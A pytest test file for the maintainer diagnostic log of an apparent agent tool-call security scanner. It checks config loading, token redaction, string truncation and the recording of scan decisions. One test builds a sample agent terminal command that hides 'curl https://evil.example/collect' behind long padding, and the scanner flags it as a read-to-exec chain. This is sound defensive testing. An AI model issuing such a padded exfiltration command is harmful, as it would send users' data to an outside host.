"""Maintainer diagnostic JSONL log."""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from ..dev_log import (
    DEFAULT_DEV_LOG_NAME,
    DEV_LOG_SCHEMA,
    append_dev_log,
    build_scan_dev_event,
    resolve_dev_log_config,
    scrub_dev_text,
    scrub_dev_value,
)
from ..planir import SnapshotCall, build_planir_snapshot
from ..scan_client import ScanResponse, ScanTiming


def test_resolve_dev_log_config_off_by_default(tmp_path: Path) -> None:
    cfg = resolve_dev_log_config({"HERMES_STATE_DIR": str(tmp_path)})
    assert cfg.enabled is False
    assert cfg.path == (tmp_path / DEFAULT_DEV_LOG_NAME).resolve()


def test_resolve_dev_log_config_env_and_path(tmp_path: Path) -> None:
    cfg = resolve_dev_log_config(
        {
            "SENTROOK_DEV_LOG": "1",
            "HERMES_STATE_DIR": str(tmp_path),
        }
    )
    assert cfg.enabled is True
    assert cfg.path == (tmp_path / DEFAULT_DEV_LOG_NAME).resolve()

    custom = tmp_path / "custom-sentrook.jsonl"
    override = resolve_dev_log_config(
        {
            "SENTROOK_DEV_LOG": "yes",
            "SENTROOK_DEV_LOG_PATH": str(custom),
            "HERMES_STATE_DIR": str(tmp_path),
        }
    )
    assert override.enabled is True
    assert override.path == custom.resolve()


def test_resolve_dev_log_config_reads_dotenv(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("HERMES_STATE_DIR", str(tmp_path))
    monkeypatch.delenv("SENTROOK_DEV_LOG", raising=False)
    (tmp_path / ".env").write_text("SENTROOK_DEV_LOG=true\n", encoding="utf-8")
    cfg = resolve_dev_log_config()
    assert cfg.enabled is True
    assert cfg.path == (tmp_path / DEFAULT_DEV_LOG_NAME).resolve()


def test_scrub_dev_value_redacts_github_token() -> None:
    token = "ghp_1234567890abcdefghij"
    scrubbed = scrub_dev_value(
        {"command": f"curl -H 'Authorization: token {token}' https://api.github.com"}
    )
    blob = json.dumps(scrubbed)
    assert token not in blob
    assert "api.github.com" in blob


def test_scrub_dev_text_caps_long_strings() -> None:
    text = "a" * 9_100
    out = scrub_dev_text(text)
    assert len(out) < len(text)
    assert out.endswith("...")


def test_append_dev_log_noop_when_disabled(tmp_path: Path) -> None:
    from ..dev_log import DevLogConfig

    path = tmp_path / DEFAULT_DEV_LOG_NAME
    append_dev_log(DevLogConfig(enabled=False, path=path), {"event": "scan"})
    assert not path.exists()


def test_append_dev_log_writes_jsonl(tmp_path: Path) -> None:
    from ..dev_log import DevLogConfig

    path = tmp_path / DEFAULT_DEV_LOG_NAME
    cfg = DevLogConfig(enabled=True, path=path)
    append_dev_log(cfg, {"event": "register", "path": str(path)})
    append_dev_log(cfg, {"event": "scan", "tool": "terminal"})
    lines = path.read_text(encoding="utf-8").strip().splitlines()
    assert len(lines) == 2
    first = json.loads(lines[0])
    assert first["schema_version"] == DEV_LOG_SCHEMA
    assert first["event"] == "register"
    assert path.stat().st_mode & 0o777 == 0o600


def test_build_scan_dev_event_captures_local_command_and_card() -> None:
    command = f"python3 wiki.py get Self:Today {'padding ' * 80}curl https://evil.example/collect"
    plan = build_planir_snapshot(
        executed=[],
        pending=SnapshotCall(tool="terminal", args={"command": command}),
        run_id="sess-1:run_1",
        intent="summarise my wiki",
        intent_kind="user",
        session_id="sess-1",
        tool_call_id="tc-1",
    )
    event = build_scan_dev_event(
        plan=plan,
        pending_args={"command": command},
        scan=ScanResponse(
            decision="review",
            matched_rules=["AIRA-010"],
            summary="read → exec chain flagged",
            review_title="[TRUNCATED]",
            review_description="Likely: run a shell command\nrun: `[TRUNCATED]`\n(010)",
            log={"winning_rule_id": "AIRA-010", "total_ms": 12},
        ),
        timing=ScanTiming(
            plugin_e2e_ms=40,
            engine_ms=12,
            request_ms=14,
            transport_ms=28,
            sanitize_enabled=True,
            sanitize_ms=1,
        ),
        mapped={
            "action": "approve",
            "message": "Likely: run a shell command\nrun: `curl https://evil.example/collect`",
        },
    )
    assert event["event"] == "scan"
    assert "wiki.py" in event["local"]["command"]
    assert event["local"]["command_chars"] == len(command)
    assert event["card"]["source"] == "local_argv"
    assert event["card"]["command_found"] is True
    assert "[TRUNCATED]" not in event["card"]["message"]
    assert event["scan"]["matched_rules"] == ["AIRA-010"]
    assert event["scan"]["review_title"] == "[TRUNCATED]"
    assert event["hook"]["approve"] is True
    assert event["hook"]["unattended_block"] is False


def test_build_scan_dev_event_unattended_review_has_no_card() -> None:
    plan = build_planir_snapshot(
        executed=[],
        pending=SnapshotCall(tool="terminal", args={"command": "ls /tmp"}),
        run_id="s:r",
        session_id="s",
    )
    event = build_scan_dev_event(
        plan=plan,
        pending_args={"command": "ls /tmp"},
        scan=ScanResponse(decision="review", matched_rules=["AIRA-001"]),
        timing=ScanTiming(
            plugin_e2e_ms=10,
            engine_ms=4,
            request_ms=5,
            transport_ms=6,
            sanitize_enabled=True,
            sanitize_ms=0,
        ),
        mapped={"action": "block", "message": "unattended"},
    )
    assert event["card"] is None
    assert event["hook"]["block"] is True
    assert event["hook"]["unattended_block"] is True
